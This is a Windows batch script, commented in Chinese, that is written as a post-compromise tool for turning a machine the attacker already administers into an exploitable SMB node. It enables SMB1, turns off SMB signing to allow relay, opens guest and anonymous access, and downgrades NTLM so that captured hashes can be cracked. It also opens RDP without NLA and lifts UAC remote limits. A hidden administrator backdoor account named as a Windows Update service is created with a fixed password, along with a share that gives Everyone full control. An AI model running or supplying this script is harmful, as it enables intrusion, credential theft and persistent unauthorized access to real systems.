@echo off
setlocal EnableDelayedExpansion
:: ============================================================
::  SMB 侧攻击面开启脚本（在已取得管理员权限的目标机上运行）
::  用途：把目标机改造成可直接被利用/中继/投递的 SMB 节点
::  要求：管理员权限运行（右键“以管理员身份运行”）
::  全部改动可逆，末尾给出回滚脚本
:: ============================================================

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] 需要管理员权限，请右键“以管理员身份运行”
    pause & exit /b 1
)
echo [+] 已获得管理员权限，开始配置...

:: ---------- 1. 确保 SMB 服务端/客户端组件存在并运行 ----------
echo [1/10] 启用 SMB 组件与服务...
dism /online /enable-feature /featurename:SMB1Protocol /all /norestart >nul 2>&1
dism /online /enable-feature /featurename:SMB1Protocol-Server /all /norestart >nul 2>&1
dism /online /enable-feature /featurename:SMB1Protocol-Client /all /norestart >nul 2>&1
sc config LanmanServer start= auto >nul 2>&1
sc config LanmanWorkstation start= auto >nul 2>&1
net start LanmanServer >nul 2>&1
net start LanmanWorkstation >nul 2>&1

:: ---------- 2. 关闭 SMB 签名（中继的前提） ----------
echo [2/10] 关闭 SMB 签名（EnableSecuritySignature=0, RequireSecuritySignature=0）...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableSecuritySignature  /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v EnableSecuritySignature  /t REG_DWORD /d 0 /f >nul
:: Win10/11 新路径（SmbServerConfiguration）
powershell -NoP -C "try{Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force}catch{}" >nul 2>&1

:: ---------- 3. 允许来宾/匿名访问（免凭据即可列共享/读文件） ----------
echo [3/10] 开启来宾/匿名访问...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RestrictNullSessAccess /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSAM /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >nul
net user guest /active:yes >nul 2>&1
net user guest /passwordreq:no >nul 2>&1

:: ---------- 4. NTLMv1 降级（让抓到的挑战可被破解，配合 responder） ----------
echo [4/10] 设置 LmCompatibilityLevel=2（允许 NTLMv1 应答，抓到的哈希可 CPU 破）...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 2 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v NtlmMinClientSec /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f >nul

:: ---------- 5. 防火墙放行 SMB/RPC/RDP/WinRM ----------
echo [5/10] 防火墙放行 445/139/135/3389/5985...
netsh advfirewall firewall add rule name="SMB-TCP-445" dir=in action=allow protocol=TCP localport=445 >nul 2>&1
netsh advfirewall firewall add rule name="SMB-TCP-139" dir=in action=allow protocol=TCP localport=139 >nul 2>&1
netsh advfirewall firewall add rule name="SMB-UDP-137-138" dir=in action=allow protocol=UDP localport=137,138 >nul 2>&1
netsh advfirewall firewall add rule name="RPC-135" dir=in action=allow protocol=TCP localport=135 >nul 2>&1
netsh advfirewall firewall add rule name="RDP-3389" dir=in action=allow protocol=TCP localport=3389 >nul 2>&1
netsh advfirewall firewall add rule name="WinRM-5985" dir=in action=allow protocol=TCP localport=5985 >nul 2>&1
netsh advfirewall firewall add rule name="SMB-ALL-OUT" dir=out action=allow protocol=TCP localport=445 >nul 2>&1
netsh advfirewall set allprofiles state on >nul 2>&1

:: ---------- 6. 关闭 Microsoft 网络客户端签名/加固策略（若存在） ----------
echo [6/10] 放宽 SMB 相关安全策略...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableOplocks /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB2 /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v Size /t REG_DWORD /d 3 /f >nul

:: ---------- 7. 开启 RDP（远程桌面，作为第二条通道） ----------
echo [7/10] 开启远程桌面（关闭 NLA 以便口令直连）...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f >nul
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >nul 2>&1

:: ---------- 8. 允许本地管理员远程使用（UAC 远程限制） ----------
echo [8/10] 关闭 UAC 远程限制（LocalAccountTokenFilterPolicy=1）...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul

:: ---------- 9. 建立后门账号（隐藏名 + 管理员组 + 永不过期） ----------
echo [9/10] 建立后门账号...
net user svc_winupd$ P@ssw0rd!2024 /add /expires:never /comment:"Windows Update Service" >nul 2>&1
net localgroup administrators svc_winupd$ /add >nul 2>&1
net localgroup "Remote Desktop Users" svc_winupd$ /add >nul 2>&1
:: 注册表隐藏账号（不出现在登录界面）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_winupd$ /t REG_DWORD /d 0 /f >nul 2>&1
:: 顺手把 Administrator 激活并设已知口令（可选，注释掉以免打草惊蛇）
:: net user Administrator P@ssw0rd!2024
:: net user Administrator /active:yes

:: ---------- 10. 建立共享（用于投递/取证，Everyone 完全控制） ----------
echo [10/10] 建立可写共享 SYSVOL_CACHE...
if not exist C:\ProgramData\SysCache mkdir C:\ProgramData\SysCache >nul 2>&1
icacls C:\ProgramData\SysCache /grant Everyone:(OI)(CI)F /t >nul 2>&1
net share SYSVOL_CACHE=C:\ProgramData\SysCache /grant:Everyone,FULL >nul 2>&1

echo.
echo ============================================================
echo  [+] 配置完成，当前状态：
echo ============================================================
netsh advfirewall show allprofiles state | findstr /i "State"
sc query LanmanServer | findstr /i "STATE"
net share | findstr /i "SYSVOL_CACHE"
net user svc_winupd$ 2>nul | findstr /i "Account active"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature 2>nul
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel 2>nul
echo.
echo  [i] 部分设置需重启生效：shutdown /r /t 0
echo  [i] 回滚请运行同目录 revert_smb.bat
echo ============================================================
pause
